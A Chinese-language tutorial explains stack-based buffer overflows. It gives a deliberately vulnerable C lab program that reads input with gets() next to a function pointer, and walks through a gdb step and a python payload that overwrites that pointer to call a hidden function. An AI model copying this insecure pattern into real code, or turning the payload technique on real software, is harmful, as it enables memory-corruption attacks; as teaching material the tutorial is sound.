# 标题：投稿-二进制攻击的艺术 【基于栈的溢出】

亲爱的黑客同行和安全爱好者们，

## 1. 什么是二进制攻击？

大家好！我计划发布一系列关于“二进制Exploitation”的文章。这是一个在黑客领域中既重要又广泛的主题。尽管对于那些没有计算机背景的人来说，这可能不是最吸引人的内容，但我希望尽可能以简单易懂的方式讲解这些知识。请注意，如果你已经具备了一定的基础知识，那么你一定会对接下来的内容感兴趣。

二进制漏洞攻击是网络安全中的一个重要主题，其目的是发现并利用程序中的漏洞来获取控制权或修改程序功能。计算机使用二进制语言（0和1）进行数据存储和计算。二进制攻击的基本原理是利用程序中的缺陷和漏洞，导致意外和不可预测的行为发生。

### 先修课程
- 编程基础
- 64位汇编
- Linux终端使用

现在让我们从一个简单的基于栈的缓冲区溢出开始。

## 2. 缓冲区溢出

缓冲区溢出攻击有两种主要类型：基于堆的和基于栈的。这两种攻击都利用了应用程序等待用户输入的特点。当程序尝试将超过其能够接收的数据量填充到内存缓冲区时，就会发生缓冲区溢出。攻击者通过覆盖应用程序的内存来执行缓冲区溢出攻击，从而导致程序崩溃或执行任意代码。缓冲区溢出是一种常见的软件漏洞，可以被用来实现远程代码执行（RCE）或拒绝服务（DoS）攻击。

## 3. 漏洞C程序示例

下面是一个包含缓冲区溢出漏洞的C程序示例：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *gets(char *);

void abracadabra() {  
    printf("Success..! Function called :D\n");  
    exit(0);  
}

int main(int argc, char **argv) {  
    struct {  
        char buffer[64];  
        volatile int (*point)();  
    } hackvist;  

    hackvist.point = NULL;  
    gets(hackvist.buffer);  

    if (hackvist.point) {  
        printf("Function Pointer → %p\n", (void*)hackvist.point);  
        fflush(stdout);  
        hackvist.point();  
    } else {  
        printf("Try Again\n");  
    }  

    exit(0);  
}
```

### 我们的目标
我们的目标是执行未被调用的`abracadabra`函数。该函数定义在代码中但从未被直接调用。我们可以通过覆盖指针`hackvist.point`来实现这一点。

### 代码分析
- 程序定义了一个大小为64字节的缓冲区`buffer`和一个函数指针`point`。
- `point`初始值为`NULL`。
- `gets()`函数用于从标准输入读取字符，并将其存储为C字符串，直到遇到换行符或文件结束。
- 如果`point`不为`NULL`，则输出指针地址并调用该函数；否则，提示“Try Again”。

### 编译和运行
编译上述代码时会看到警告信息，提示`gets()`函数非常危险，因为它无法防止缓冲区溢出。我们可以忽略这个警告并继续编译。

```sh
gcc -o stack-three stack-three.c
./stack-three
```

## 4. 为什么`gets()`是非常危险的？

`gets()`函数假设用户输入是可信的，不会检查输入长度。因此，攻击者可以轻松地发送大量数据，导致缓冲区溢出。这种溢出可以覆盖相邻的内存区域，包括函数指针，从而改变程序的执行流程。

## 5. 利用缓冲区溢出

为了利用这个漏洞，我们需要覆盖`point`指针，使其指向`abracadabra`函数的地址。我们可以通过以下步骤来实现：

1. **确定`abracadabra`函数的地址**：
   使用`gdb`调试器找到`abracadabra`函数的地址。

   ```sh
   gdb ./stack-three
   (gdb) disassemble abracadabra
   ```

2. **构造payload**：
   创建一个Python脚本来生成payload。payload由64字节的填充数据和`abracadabra`函数的地址组成。

   ```python
   payload = "A" * 64 + "\x9d\x06\x40"
   print(payload)
   ```

3. **运行程序并注入payload**：
   将payload作为输入传递给程序。

   ```sh
   python -c 'print("A" * 64 + "\x9d\x06\x40")' | ./stack-three
   ```

如果一切顺利，程序将输出“Success..! Function called :D”，表明我们成功利用了缓冲区溢出漏洞。

通过这种方式，我们可以理解并利用基于栈的缓冲区溢出攻击。希望这篇教程对你有所帮助！如果你有任何问题或需要进一步的解释，请随时联系我。